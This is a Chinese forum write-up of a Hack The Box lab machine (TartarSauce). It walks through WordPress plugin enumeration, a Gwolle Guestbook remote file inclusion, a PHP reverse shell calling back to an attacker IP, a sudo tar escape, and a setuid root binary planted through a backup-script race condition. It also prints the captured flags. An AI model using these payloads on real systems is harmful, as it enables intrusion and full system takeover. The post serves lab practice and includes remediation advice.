---
title: "历时八小时，拿下HTB TartarSauce靶机，附详细渗透记录"
source: "https://linux.do/t/topic/537596"
author:
  - "[[user792]]"
published: 2026-05-09
created: 2026-05-09
---
I just pwned TartarSauce on Hack The Box! [https://www.hackthebox.com/achievement/machine/2283976/138](https://www.hackthebox.com/achievement/machine/2283976/138) #HackTheBox #htb #CyberSecurity #EthicalHacking #InfoSec #PenTesting  
我刚在 Hack The Box 上攻破了 TartarSauce！https://www.hackthebox.com/achievement/machine/2283976/138 #HackTheBox #htb #CyberSecurity #EthicalHacking #InfoSec #PenTesting  

[![[99de10b45f2b3b2dd8ff9760c126848a_MD5.jpg]]

image701×638 101 KB

](https://cdn3.ldstatic.com/original/4X/a/f/d/afdb0f752edfdd2462a7c6d2b76c71c943d45d26.jpeg "image")

  
这是一次艰难的攻击  
详细记录如下

# HTB TartarSauce 渗透测试详细记录

## 1\. 初始侦察阶段

- **端口扫描命令及参数**
	```bash
	nmap -sT -min-rate 10000 -p- 10.10.10.88
	```
- **开放端口及服务列表**
	```bash
	PORT   STATE SERVICE
	80/tcp open  http
	```
- **针对开放端口进行深入探测**
	```bash
	nmap -sT -sC -sV -p80 10.10.10.88
	```
	```bash
	PORT   STATE SERVICE VERSION
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Landing Page
	| http-robots.txt: 5 disallowed entries 
	| /webservices/tar/tar/source/ 
	| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
	|_/webservices/developmental/ /webservices/phpmyadmin/
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	```

## 2\. 服务探测与信息收集

- **Web服务分析**
	- 访问 [http://10.10.10.88/](http://10.10.10.88/) 是一张字符画，并没有什么有效信息
		- 使用feroxbuster进行枚举：
		```bash
		feroxbuster -u http://10.10.10.88/
		```
		- 发现目录：`http://10.10.10.88/webservices/wp`
		- 访问该目录加载缓慢，使用F12打开浏览器控制台，发现以下内容：
		```ruby
		Link: <http://tartarsauce.htb/webservices/wp/index.php/wp-json/>; rel="https://api.w.org/"
		```
- **域名发现与解析**
	- 添加主机名解析：
		```bash
		echo '10.10.10.88 tartarsauce.htb' | sudo tee -a /etc/hosts
		```
		- 访问 [http://tartarsauce.htb/webservices/wp/](http://tartarsauce.htb/webservices/wp/) 可以正常加载，确认这是一个WordPress站点
- **应用程序识别**
	- 确认为WordPress网站
- **版本信息收集**
	- 使用WPScan进行扫描：
		```bash
		wpscan --url http://tartarsauce.htb/webservices/wp/
		```
		- 经过多次扫描，没有获取有效信息，尝试采用激进模式：
		```bash
		wpscan --url http://tartarsauce.htb/webservices/wp/ -e ap --plugins-detection aggressive
		```
		- 参数说明：
		- `-url`: 要扫描的url地址
				- `-e ap`: 遍历所有插件
				- `--plugins-detection aggressive`: 使用激进模式
		- 历时一小时零六分钟，扫描发现三个WordPress插件：
		```yaml
		Checking Known Locations - Time: 00:00:40 <                                                                > (1195 / 109869)  1.08%  ETA: 01:01:01
		 Checking Known Locations - Time: 00:37:12 <===================================                            > (63381 / 109869) 57.68%  ETA: 00:27:17
		 Checking Known Locations - Time: 00:49:46 <===============================================                > (83063 / 109869) 75.60%  ETA: 00:16:04
		 Checking Known Locations - Time: 01:06:13 <=============================================================> (109869 / 109869) 100.00% Time: 01:06:13
		```
		- Akismet (版本4.0.3，过时，最新版本为5.3.7)
				- Brute Force Login Protection (版本1.5.3，最新版本)  
			暴力破解登录保护（版本 1.5.3，最新版本）
				- Gwolle Guestbook (版本2.3.10，过时，最新版本为4.8.1)

## 3\. 漏洞识别与初始访问

- **发现的潜在漏洞**
	- 检查Gwolle-gb插件是否存在可利用漏洞：
		```bash
		searchsploit gwolle
		```
		- 输出结果：
		```bash
		WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion | php/webapps/38861.txt
		```
		- 发现该插件存在远程文件包含漏洞(RFI)，但扫描版本(2.3.10)与漏洞版本(1.5.3)不一致
- **尝试的攻击向量**
	- 提取漏洞详情：
		```bash
		searchsploit -m 38861
		```
		```yaml
		Exploit: WordPress Plugin Gwolle Guestbook 1.5.3 - Remote File Inclusion
		      URL: https://www.exploit-db.com/exploits/38861
		     Path: /usr/share/exploitdb/exploits/php/webapps/38861.txt
		    Codes: CVE-2015-8351, OSVDB-129197
		 Verified: False
		File Type: Unicode text, UTF-8 text, with very long lines (392)
		Copied to: /root/38861.txt
		```
		- 漏洞分析：Gwolle Guestbook WordPress 插件中发现了一个严重的远程文件包含（RFI）漏洞，未经身份验证的攻击者可以通过包含远程 PHP 文件在易受攻击的系统上执行任意代码。  
		HTTP GET 参数 “abspath” 在被用于 PHP 的 require() 函数之前没有被正确sanitize。远程攻击者可以从任意远程服务器包含名为 ‘wp-load.php’ 的文件并在 Web 服务器上执行。为此，攻击者需要将恶意的 ‘wp-load.php’ 文件放置在其服务器的文档根目录中，并在请求中包含服务器的 URL  
		HTTP GET 参数 “abspath” 在被用于 PHP 的 require()函数之前没有被正确 sanitize。远程攻击者可以从任意远程服务器包含名为 ‘wp-load.php’ 的文件并在 Web 服务器上执行。为此，攻击者需要将恶意的 ‘wp-load.php’ 文件放置在其服务器的文档根目录中，并在请求中包含服务器的 URL  
		攻击载荷如下  
		http://\[host\]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://\[hackers\_website\]:/wp-load.php
- **成功获取初始访问的方法**
	- 创建恶意的wp-load.php文件：
		```php
		<?php
		// Gwolle Guestbook RFI Reverse Shell
		// CVE-2015-8351
		// Usage: Place this file on your attacker server and use as wp-load.php
		// CONFIGURATION - MODIFY THESE
		$ip = '10.10.16.16';   // YOUR ATTACK MACHINE IP
		$port = 9999;          // YOUR LISTENER PORT
		// Payload Generation
		$socket = fsockopen($ip, $port);
		$descriptorspec = array(
		   0 => array("pipe", "r"),  // stdin
		   1 => array("pipe", "w"),  // stdout
		   2 => array("pipe", "w")   // stderr
		);
		$process = proc_open('/bin/bash', $descriptorspec, $pipes, NULL, NULL);
		if (is_resource($process)) {
		    stream_set_blocking($pipes[0], 0);
		    stream_set_blocking($pipes[1], 0);
		    stream_set_blocking($pipes[2], 0);
		    stream_set_blocking($socket, 0);
		    while (1) {
		        $read = array($socket, $pipes[1], $pipes[2]);
		        $write = NULL;
		        $except = NULL;
		        if (stream_select($read, $write, $except, 60) === false) {
		            break;
		        }
		        if (in_array($socket, $read)) {
		            $input = fread($socket, 1024);
		            if ($input !== false && strlen($input) > 0) {
		                fwrite($pipes[0], $input);
		            }
		        }
		        foreach (array(1, 2) as $pipe) {
		            if (in_array($pipes[$pipe], $read)) {
		                $output = fread($pipes[$pipe], 1024);
		                if ($output !== false && strlen($output) > 0) {
		                    fwrite($socket, $output);
		                }
		            }
		        }
		    }
		    fclose($socket);
		    foreach ($pipes as $pipe) {
		        fclose($pipe);
		    }
		    proc_close($process);
		}
		?>
		```
		- 启动HTTP服务器：
		```bash
		python -m http.server
		```
		- 开启反弹Shell监听：
		```bash
		nc -lvnp 9999
		```
		- 访问构造的URL触发漏洞：
		```ruby
		http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.16.16:8000/
		```
		- 注意：直接包含IP+端口即可，不需要包含文件名
- **凭证获取过程**
	- 成功获取反弹Shell：
		```sql
		listening on [any] 9999 ...connect to [10.10.16.16] from (UNKNOWN) [10.10.10.88] 54014iduid=33(www-data) gid=33(www-data) groups=33(www-data)
		```
		- 提升Shell交互性：
		```bash
		python -c 'import pty; pty.spawn("/bin/bash")'export SHELL=bashexport TERM=xterm-256color
		```
		- 按Ctrl+Z将Shell置于后台，回到本地终端
		- 本地终端配置：
		```bash
		stty raw -echo;fg
		```
		- 按回车键，然后输入reset重新初始化终端

## 4\. 横向移动

- **用户枚举与权限分析**
	- 检查当前用户sudo权限：
		```bash
		sudo -l
		```
		- 输出结果：
		```ruby
		Matching Defaults entries for www-data on TartarSauce:
		    env_reset, mail_badpass,
		    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
		```
- **获取的敏感信息**
	- 发现可以使用sudo无密码执行tar命令
- **凭证收集与利用**
	- 无需额外凭证
- **跨系统/服务移动方法**
	- 利用tar命令提权到onuma用户：
		```bash
		sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
		```
		- 成功获取onuma用户权限：
		```bash
		$ id
		uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
		```
		- 获取key1：  获取 key1：
		```bash
		$ cat /home/onuma/user.txt
		843ad5dd2868c1179c20a990689fe1a9
		```

## 5\. 权限提升前的信息收集

- **本地文件分析**
	- 尝试检查onuma用户的sudo权限（失败）：
		```bash
		$ sudo -l
		[sudo] password for onuma:Sorry, try again.[sudo] password for onuma:
		```
		- 尝试查看定时任务：
		```bash
		systemctl list-timers
		```
		- 输出结果：
		```yaml
		NEXT                         LEFT     LAST                         PASSED
		Sun 2025-04-06 10:17:21 EDT  40s left Sun 2025-04-06 10:12:21 EDT  4min 19s ago
		Sun 2025-04-06 22:41:56 EDT  12h left Sun 2025-04-06 06:46:39 EDT  3h 30min ago
		Mon 2025-04-07 05:45:02 EDT  19h left Sun 2025-04-06 05:45:02 EDT  4h 31min ago
		Mon 2025-04-07 06:33:24 EDT  20h left Sun 2025-04-06 06:04:18 EDT  4h 12min ago
		```
- **敏感数据发现**
	- 上传linenum.sh脚本进行进一步枚举：
		```bash
		cd /tmpwget http://10.10.16.16:8000/linenum.shchmod 777 linenum.sh./linenum.sh
		```
		- 发现关键定时任务信息：
		```yaml
		Systemd timers:
		NEXT                         LEFT          LAST                         PASSED
		     UNIT                         ACTIVATES
		Sun 2025-04-06 10:42:31 EDT  4min 27s left Sun 2025-04-06 10:37:31 EDT  32s ago       backuperer.timer             backuperer.service
		Sun 2025-04-06 22:41:56 EDT  12h left      Sun 2025-04-06 06:46:39 EDT  3h 51minn ago apt-daily.timer              apt-daily.service
		Mon 2025-04-07 05:45:02 EDT  19h left      Sun 2025-04-06 05:45:02 EDT  4h 53minn ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
		Mon 2025-04-07 06:33:24 EDT  19h left      Sun 2025-04-06 06:04:18 EDT  4h 33minn ago apt-daily-upgrade.timer      apt-daily-upgrade.service
		4 timers listed.
		```
		- 确认系统版本为32位：
		```bash
		uname -a
		Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
		```
- **内存进程检查**
	- 下载进程监控工具pspy32：
		```bash
		wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32
		python -m http.server
		# 目标机器操作
		curl -o pspy32 http://10.10.16.16:8000/pspy32chmod 777 pspy32
		```
		- 启动进程监控，等待约五分钟，定位备份任务：
		```swift
		./pspy322025/04/06 10:53:12 CMD: UID=0     PID=22552  | /bin/bash /usr/sbin/backuperer
		```
		- 定位备份文件：
		```bash
		locate backuper
		/etc/systemd/system/multi-user.target.wants/backuperer.timer
		/lib/systemd/system/backuperer.service
		/lib/systemd/system/backuperer.timer
		/usr/sbin/backuperer
		```
- **特殊文件提取与分析**
	- 查看backuperer.timer文件：
		```bash
		$ cat /lib/systemd/system/backuperer.timer
		[Unit]
		Description=Runs backuperer every 5 mins
		[Timer]
		# Time to wait after booting before we run first time
		OnBootSec=5min
		# Time between running each consecutive time
		OnUnitActiveSec=5min
		Unit=backuperer.service
		[Install]
		WantedBy=multi-user.target
		```
		- 分析备份脚本内容：
		```bash
		cat /usr/sbin/backuperer
		#!/bin/bash
		#-------------------------------------------------------------------------------------
		# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
		# ONUMA Dev auto backup program
		# This tool will keep our webapp backed up incase another skiddie defaces us again.
		# We will be able to quickly restore from a backup in seconds ;P
		#-------------------------------------------------------------------------------------
		# Set Vars Here
		basedir=/var/www/html
		bkpdir=/var/backups
		tmpdir=/var/tmp
		testmsg=$bkpdir/onuma_backup_test.txt
		errormsg=$bkpdir/onuma_backup_error.txt
		tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
		check=$tmpdir/check
		# formatting
		printbdr()
		{
		    for n in $(seq 72);
		    do /usr/bin/printf $"-";
		    done
		}
		bdr=$(printbdr)
		# Added a test file to let us see when the last backup was run
		/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg
		# Cleanup from last time.
		/bin/rm -rf $tmpdir/.* $check
		# Backup onuma website dev files.
		/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &
		# Added delay to wait for backup to complete if large files get added.
		/bin/sleep 30
		# Test the backup integrity
		integrity_chk()
		{
		    /usr/bin/diff -r $basedir $check$basedir
		}
		/bin/mkdir $check
		/bin/tar -zxvf $tmpfile -C $check
		if [[ $(integrity_chk) ]]
		then
		    # Report errors so the dev can investigate the issue.
		    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
		    integrity_chk >> $errormsg
		    exit 2
		else
		    # Clean up and save archive to the bkpdir.
		    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
		    /bin/rm -rf $check .*
		    exit 0
		fi
		$
		```
		变量设置
		```bash
		basedir=/var/www/html      # 要备份的网站目录
		bkpdir=/var/backups        # 备份文件存储目录
		tmpdir=/var/tmp            # 临时文件目录
		testmsg=$bkpdir/onuma_backup_test.txt    # 记录备份运行时间的文件
		errormsg=$bkpdir/onuma_backup_error.txt  # 错误日志文件
		tmpfile=$tmpdir/.$(...)    # 生成一个随机名称的临时文件
		check=$tmpdir/check        # 用于完整性检查的临时目录
		```
		脚本执行流程
		1. 在测试消息文件中记录备份运行的时间
				2. 清理上次的临时文件
				3. 以onuma用户身份创建网站目录的tar压缩文件
				4. 等待30秒给压缩过程足够的时间完成
				5. 定义了一个完整性检查函数，用于比较原始目录和解压后的备份
				6. 创建检查目录并将临时备份文件解压到该目录
				7. 执行完整性检查
				8. 如检查失败，记录错误；如检查通过，保存备份并清理临时文件
		利用点  
		由于备份和验证之间有明确的时间窗口（30秒等待时间），存在潜在的竞态条件漏洞。攻击者可能在tar创建完毕但完整性检查尚未开始前修改临时文件内容。

## 6\. 权限提升

这个漏洞的利用方法不是很直观，简单描述如下  
在创建备份时，脚本会在执行其他命令之前暂停 30 秒。在这这 30 秒内，我可以用我的恶意文件替换掉脚本的 tar 文件，。  
经过 30 秒后，它将在“check”目录下创建一个目录，并将我的恶意备份 tar 文件解压到那里。然后它将进行完整性检查并失败，在下一次计划任务运行之前，我有 5 分钟的时间提权。一旦 5 分钟过去，backuperer 程序再次运行，我的文件就会被删除。

- **利用的漏洞或特权升级方法**
	- 备份脚本中的竞态条件漏洞：备份和验证之间存在30秒的时间窗口
		- 攻击者可在tar创建完毕但完整性检查前修改临时文件内容
- **工具使用及命令**
	- 在本地创建包含SUID可执行文件的目录结构：
		```bash
		# 创建目录结构
		mkdir -p var/www/html
		# 创建提权程序
		vi var/www/html/exp.c 
		#include <unistd.h>
		int main()
		{
		    setuid(0);
		    execl("/bin/bash", "bash", (char *)NULL);
		    return 0;
		}
		```
		- 安装gcc的32位支持库，编译程序（第一次尝试，未成功）：
		```bash
		sudo apt update
		sudo apt install gcc-multilib
		gcc -m32 -o exp exp.cchmod u+s exp
		```
		- 压缩整个 var 目录，并将其保存到文件 exp1 中：
		```bash
		tar -zcvf exp1 var
		```
		- 开启http服务
		```bash
		python -m http.server
		```
		- 在目标机器上，从目录 /var/tmp 下载exp1
		```bash
		cd /var/tmp
		wget http://10.10.16.16:8000/exp1
		--2025-04-06 11:21:59--  http://10.10.16.16:8000/exp1
		Connecting to 10.10.16.16:8000... connected.
		HTTP request sent, awaiting response... 200 OK
		Length: 2557 (2.5K) [application/octet-stream]
		Saving to: 'exp1'
		exp1   100%[===================>]   2.50K  --.-KB/s    in 0s
		2025-04-06 11:22:00 (684 MB/s) - 'exp1' saved [2557/2557]
		```
		- 现在等待计划中的备份服务运行并创建临时文件。这每 5 分钟发生一次。要查看计划中的服务再次运行前还有多少时间，命令如下
		```bash
		systemctl list-timers
		```
		输出如下,其中第二列是距离下一次执行还有多长时间
		```bash
		NEXT                         LEFT          LAST                         PASSED
		Sun 2025-04-06 11:27:56 EDT  1min 19s left Sun 2025-04-06 11:22:56 EDT  3min 40s
		Sun 2025-04-06 22:41:56 EDT  11h left      Sun 2025-04-06 06:46:39 EDT  4h 39min
		Mon 2025-04-07 05:45:02 EDT  18h left      Sun 2025-04-06 05:45:02 EDT  5h 41min
		Mon 2025-04-07 06:33:24 EDT  19h left      Sun 2025-04-06 06:04:18 EDT  5h 22min
		```
		- 在临时文件生成后替换文件：
		```bash
		cp exp1 .7b5bace50dbf6f3195daba5b76f66fee7508b6c2
		```
		- 在目标机器上尝试执行编译的程序（失败）：
		```bash
		cd check/var/www/html/
		./exp
		./exp: /lib/i386-linux-gnu/libc.so.6: version \`GLIBC_2.34' not found (required by ./exp)
		```
		这个错误表明我的 exp 需要 GLIBC 2.34 版本，但目标机器上没有安装这个版本的 32 位 libc 库。
		- 检查目标机器的glibc版本：
		```bash
		ldd --version
		ldd (Ubuntu GLIBC 2.23-0ubuntu10) 2.23
		```
		我的机器是2.34版本， 目标机器是2.34,不兼容，只能重新编译exp  
		解决方法如下 ：
		**静态编译，生成一个不依赖系统glibc版本的exp**
		- 重新静态编译程序（成功方案）：
		```bash
		gcc -m32 -static -o exp exp.c
		#编译完成之后，设置SUID位置
		chmod u+s exp
		#打包为exp2
		tar -zcvf exp2 var
		```
- **提权的详细过程**
	- 上传静态编译的恶意程序：
		```bash
		cd /var/tmp
		wget http://10.10.16.16:8000/exp2
		```
		- 等待备份任务执行，检查任务计时：
		```bash
		systemctl list-timers
		```
		- 在临时文件生成后替换文件：
		```bash
		cp exp2 .90cc6cf0642a24be01cf1de8479aba963fe355c4
		```
		- 等待备份脚本解压文件，查看结果：
		```bash
		#进入/check/var/www/html 目录
		cd check/var/www/html/
		#查看exp详细信息
		ls -al
		total 732
		drwxr-xr-x 2 root root   4096 Apr  6  2025 .
		drwxr-xr-x 3 root root   4096 Apr  6 11:29 ..
		-rwsr-xr-x 1 root root 729272 Apr  6  2025 exp
		-rw-r--r-- 1 root root    110 Apr  6 11:31 exp.c
		-rw-r--r-- 1 root root     45 Apr  6  2025 exp2
		```
		会看到我设置了 SUID 位的exp文件
		exp仍然保留了 SUID 位的原因是：当压缩文件解压时，它是用 root 权限（定时程序运行的权限）解压的，因此，文件的权限得到了保留。
		- 执行SUID程序获取root权限：
		```bash
		./exp
		```
- **验证权限提升成功的证明**
	- 验证身份：
		```bash
		root@TartarSauce:/var/tmp/check/var/www/html# whoami
		root
		```
		- 获取key2：  获取 key2：
		```bash
		root@TartarSauce:/var/tmp/check/var/www/html# cd /root
		root@TartarSauce:/root# ls
		root.txt  sys.sql  wp.sql
		root@TartarSauce:/root# cat root.txt
		efecb871c5d1977a56c455ad8b392387
		```

## 7\. 总结与安全建议

- **安全漏洞列表**
	- WordPress Gwolle Guestbook插件远程文件包含漏洞(CVE-2015-8351)
		- 不安全的sudo配置允许www-data用户执行tar命令
		- 备份脚本中的竞态条件漏洞
- **风险等级评估**
	- RFI漏洞：严重（允许未授权的远程代码执行）
		- sudo配置不当：高（允许低权限用户执行特权命令）
		- 备份脚本竞态条件：严重（允许获取root权限）
- **详细修复建议**
	- 更新WordPress插件：
		- 将Akismet从4.0.3更新到5.3.7
				- 将Gwolle Guestbook从2.3.10更新到4.8.1
				- 移除或禁用不必要的插件
		- 修改sudo配置：
		- 移除www-data对tar命令的sudo权限
				- 如确实需要执行备份，使用更受限的命令或专用备份账户
		- 修复备份脚本：
		- 消除30秒等待时间或采取其他安全措施
				- 在解压前验证备份文件完整性（如使用签名或哈希值）
				- 使用更安全的临时文件命名和权限控制
				- 考虑使用专业备份工具代替自定义脚本
- **预防类似问题的安全策略**
	- 建立定期补丁管理流程，及时更新CMS系统和插件
		- 实施最小权限原则，严格控制sudo权限
		- 对系统脚本进行安全代码审查，特别关注竞态条件
		- 建立文件完整性监控系统
		- 对临时文件实施严格的权限控制
		- 定期进行安全意识培训和渗透测试

## 8\. 漏洞利用路径总结

- **完整攻击链路图**
	1. 通过Nmap发现开放的Web服务(80/TCP)
		2. 使用目录扫描发现WordPress安装和WordPress相关路径
		3. 通过浏览器控制台发现域名信息并添加hosts解析
		4. 使用WPScan识别存在漏洞的Gwolle Guestbook插件
		5. 尽管插件版本不匹配(2.3.10 vs 1.5.3)，仍尝试利用RFI漏洞
		6. 成功获取www-data用户的反弹Shell
		7. 利用sudo权限执行tar命令提升到onuma用户
		8. 发现定时执行的backuperer备份程序
		9. 分析备份脚本发现竞态条件漏洞
		10. 创建恶意SUID程序（首次编译失败，第二次静态编译成功）
		11. 利用备份脚本的30秒时间窗口替换临时文件
		12. 执行SUID程序成功获取root权限
- **各阶段关键点总结**
	- 初始访问：WordPress插件RFI漏洞利用，尽管版本不匹配仍然成功
		- 横向移动：利用过度宽松的sudo权限配置
		- 权限提升前的信息收集：耐心分析系统任务和脚本逻辑
		- 失败的尝试：首次编译的程序因glibc版本差异不兼容
		- 权限提升成功：利用竞态条件结合静态编译的SUID程序
- **攻击向量简明展示**
	```kotlin
	端口扫描 → 目录枚举 → 域名发现 → WordPress插件扫描 → 
	Gwolle插件RFI漏洞利用 → www-data权限 → 
	Sudo tar命令提权 → onuma用户 → 
	分析备份脚本 → 利用竞态条件 → 
	注入静态编译SUID程序(第二次尝试) → root权限
	```

---

## Comments

> **6512345** · [2025-04-06](https://linux.do/t/topic/537596/2)
> 
> 太强了！

> **qinanmail** · [2025-04-06](https://linux.do/t/topic/537596/3)
> 
> 太强了太强了

> **Bigbuoluo** · [2025-04-06](https://linux.do/t/topic/537596/4)
> 
> 干货，细细品读

> **hongkai** · [2025-04-06](https://linux.do/t/topic/537596/5)
> 
> 虽不明但觉厉 ![[e0d1a6b82f175ced5432c291a2a8424e_MD5.png]]

> **user792** · [2025-04-06](https://linux.do/t/topic/537596/6)
> 
> 都给我狠狠点赞，爆肝了我8个小时，屁股都坐疼了 ![[74d5cbc6b7c465d34809434c169be714_MD5.png]]![[74d5cbc6b7c465d34809434c169be714_MD5.png]]![[74d5cbc6b7c465d34809434c169be714_MD5.png]]